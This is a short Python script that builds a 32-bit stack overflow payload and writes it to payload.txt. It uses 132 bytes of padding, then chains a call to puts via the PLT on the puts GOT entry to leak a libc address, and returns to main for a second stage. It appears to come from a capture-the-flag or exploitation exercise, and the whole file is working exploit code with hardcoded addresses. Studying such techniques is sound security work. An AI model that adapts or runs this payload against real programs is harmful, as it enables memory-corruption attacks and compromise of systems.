import struct
payload = (b'A' * 132 +
    struct.pack("I", 0x8048340) + # puts PLT
    struct.pack("I", 0x804847b) + # main address
    struct.pack("I", 0x80497ac)  # puts GOT
)

f = open("payload.txt", "wb")
f.write(payload)
f.close()